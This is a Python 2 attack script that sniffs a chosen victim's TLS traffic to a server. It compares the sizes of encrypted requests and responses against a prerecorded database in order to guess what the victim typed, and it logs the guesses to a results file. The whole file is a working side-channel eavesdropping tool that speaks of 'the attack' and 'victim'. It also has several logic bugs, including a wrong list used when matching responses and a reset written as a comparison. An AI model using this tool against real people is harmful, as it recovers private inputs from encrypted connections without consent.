#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import pyshark
import requests
import time
from multiprocessing import Process, Queue
import utils
import json
import signal


# Global variables
GLOBAL_VICTIM_IP = ''
GLOBAL_SERVER_IP = ''
queue = Queue() # used to make the sniffing and analyzing thread communicate
DIRECTION_REQUEST = "Request"
DIRECTION_RESPONSE = "Response"


class sniffingData:
  def __init__(self):
    self.direction = '' # Type of data: Request or Response
    self.size = 0 # Size in bytes

def packetProcessing(packet):
  try:
    # Verify the different layers information of the packet we manipulate
    layersName = []
    for i in range(len(packet.layers)):
      layersName.append(packet.layers[i]._layer_name)

    # Get the packet number
    packetNumber = int(packet.number)

    # Check whether the packet has information of the 4 network layers ETH, IP, TCP, SSL
    if len(set(['eth', 'ip', 'tcp', 'ssl']).intersection(layersName)) == 4:
      src = packet.ip.src
      dst = packet.ip.dst
      if src == GLOBAL_VICTIM_IP and packet.ssl.record_content_type == '23': # The check "and packet.ssl.record_content_type == '23'" makes sure that we only get the TLS messages carrying encrypted application data and not TLS messages like "Encrypted Alerts"
        print("[FRAME: %d] (From %s, To: %s, DataLength: %s, Time: %s) ==== \t\t OUT =========>" % (packetNumber, src, dst, packet.ssl.record_length, packet.sniff_time))
        # Send data to analyzing thread
        data = sniffingData()
        data.direction = DIRECTION_REQUEST
        data.size = int(packet.ssl.record_length)
        queue.put(data)

      elif src == GLOBAL_SERVER_IP and packet.ssl.record_content_type == '23':
        print("[FRAME: %d] (From %s, To: %s, DataLength: %s, Time: %s) ==== \t\t IN <==========" % (packetNumber, src, dst, packet.ssl.record_length, packet.sniff_time))
        # Send data to analyzing thread
        data = sniffingData()
        data.direction = DIRECTION_RESPONSE
        data.size = int(packet.ssl.record_length)
        queue.put(data)

    elif len(set(['eth', 'ip', 'tcp', 'ssl']).intersection(layersName)) == 3 and 'ssl' not in layersName: # No SSL packet
      if packet.ip.src == GLOBAL_VICTIM_IP:
        # tcp.analysis_acks_frame returns "[This is an ACK to the segment in frame: 3]", so it returns the segments for which this segment is a ACK
        print("[FRAME: %d] === CLIENT ACK: This is a ACK to the segment in frame: %s \t\t [CLIENT ACK]" % (packetNumber, packet.tcp.analysis_acks_frame))
        #traffic.request = requestSize
        #traffic.response = responseSize
        # When the client ACK, we have the entire response, so we can have the total weight
        #return traffic
      elif packet.ip.src == GLOBAL_SERVER_IP:
        print("[FRAME: %d] === SERVER ACK: This is a ACK to the segment in frame: %s \t\t [SERVER ACK]" % (packetNumber, packet.tcp.analysis_acks_frame))
      else:
        print("[FRAME: %d] == unhandled TCP packet (%s)" % (packetNumber, packet.pretty_print))
    elif len(set(['eth', 'ip', 'tcp', 'ssl']).intersection(layersName)) == 2 and 'tcp' not in layersName and 'ssl' not in layersName:
      # Note: The checks "and 'tcp' not in layersName and 'ssl' not in layersName" are useless since if TCP is not in the packet
      # then SSL is obviously not either. So, if the length of the intersection of the 2 sets provides enough information
      # If the intersection is 2, it cannot be TCP and SSL alone, since these layers are on top of IP and ETH, the latter should be included
      print("[FRAME: %d] == This packet is not a TCP packet ! (%s)" % (packetNumber, packet.pretty_print))
    elif len(set(['eth', 'ip', 'tcp', 'ssl']).intersection(layersName)) == 1:
      print("[FRAME: %d] == This packet is not an IP packet ! (%s)" % (packetNumber, packet.pretty_print))
  except AttributeError, e:
    print("[Handled error] ==> ", str(e))

def sniffVictimNetwork(interfac, victimIP, serverIP):
  bpFilters = 'host ' + victimIP + ' and host ' + serverIP
  capture = pyshark.LiveCapture(interface=interfac, bpf_filter=bpFilters)
  capture.apply_on_packets(packetProcessing)


def findPaylaod(jsonFieldToLookFor, trafficWeight, dbContent):
  potentialPayloads = []
  pourcentageDiff = dict()
  minDiff = 100
  for entry in dbContent:
    for key in entry:
      recordedWeight = entry[key][jsonFieldToLookFor]
      diffence = abs(trafficWeight - recordedWeight)
      average = (trafficWeight + recordedWeight)/2.0 # We want floats here
      pourcentageDifference = (diffence/average) * 100 # Compute the % of difference between the 2 values
      pourcentageDiff[key] = pourcentageDifference
      if pourcentageDifference < minDiff:
        minDiff = pourcentageDifference
  for key, val in pourcentageDiff.iteritems():
    if val == minDiff:
      potentialPayloads.append(key)
  return potentialPayloads

def findResponseWithPotentialPayloads(trafficWeight, dbContent, potentialPayloads):
  result = []
  pourcentageDiff = dict()
  minDiff = 100
  for entry in dbContent:
    for key in entry:
      if key in potentialPayloads:
        recordedWeight = entry[key]["responseWeight"]
        diffence = abs(trafficWeight - recordedWeight)
        average = (trafficWeight + recordedWeight)/2.0 # We want floats here
        pourcentageDifference = (diffence/average) * 100 # Compute the % of difference between the 2 values
        pourcentageDiff[key] = pourcentageDifference
        if pourcentageDifference < minDiff:
          minDiff = pourcentageDifference
  for key, val in pourcentageDiff.iteritems():
    if val == minDiff:
      potentialPayloads.append(key)
  return potentialPayloads


def findRequest(trafficWeight, dbContent):
  return findPaylaod("requestWeight", trafficWeight, dbContent)

def findResponse(trafficWeight, dbContent):
  return findPaylaod("responseWeight", trafficWeight, dbContent)


def findBestPayloadMatch(dbContent, outputFile): # Direction tells weither this is a request or a response
  # The database is a global variable here
  potentialPayloadsAfterRequest = []
  while 1:
    data = queue.get() # This function will be put into a thread to avoid slowing down the sniffing
    if data.direction == DIRECTION_REQUEST:
      potentialPayloads = findRequest(data.size, dbContent)
      result = 'Size of the sniffed request: {} ==> Possible user inputs: {}'.format(data.size, potentialPayloads)
      print("DEBUG: ", result)
      # Write the potential payloads after request and use them to find the appropriate response
      potentialPayloadsAfterRequest = potentialPayloads
      outputFile.write(result)
    elif data.direction == DIRECTION_RESPONSE:
      potentialPayloads = []
      if potentialPayloadsAfterRequest == []:
        potentialPayloads = findResponse(data.size, dbContent)
      else: # We have potential payloads further to request analysis, so we want to search only for these payloads
        potentialPayloads = findResponseWithPotentialPayloads(data.size, dbContent, potentialPayloads)
        potentialPayloadsAfterRequest == [] # Reset the potentialPayloads
      result = 'Size of the sniffed response: {} ==> Possible user inputs: {}'.format(data.size, potentialPayloads)
      print("DEBUG: ", result)
      outputFile.write(result)
    else:
      print("[SHOULD NOT BE HERE]")


def signal_handler(signal, frame):
  print('[INFO] Stopping network sniffing...')
  print('[INFO] Results of the attack can be found in ./trafficRecords/results/victimPayloads.txt')
  sys.exit(0)


## main ##############@
if len(sys.argv) < 3:
    print("""Invalid number of arguments
Use: python networkAnalyzer.py [interface] [victimIP] [serverIP]""")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Defining the environment
interfac = sys.argv[1]
victimIP = sys.argv[2]
serverIP = sys.argv[3] # Obtained after a traceroute

GLOBAL_VICTIM_IP = victimIP
GLOBAL_SERVER_IP = serverIP

# Open DB file and extract it here to save some time for the real time attack
dbName = './trafficRecords/results/database.json'
dbFile = open(dbName, 'r')
dbContent = json.load(dbFile)
dbFile.close()

outputFileName = './trafficRecords/results/victimPayloads.txt'
outputFile = open(outputFileName, 'w+')
try:
  analyzingThread = Process(target=findBestPayloadMatch, args=(dbContent, outputFile,))
  analyzingThread.start()
finally:
  outputFile.close()

sniffingThread = Process(target=sniffVictimNetwork, args=(interfac, victimIP, serverIP,))
sniffingThread.start()
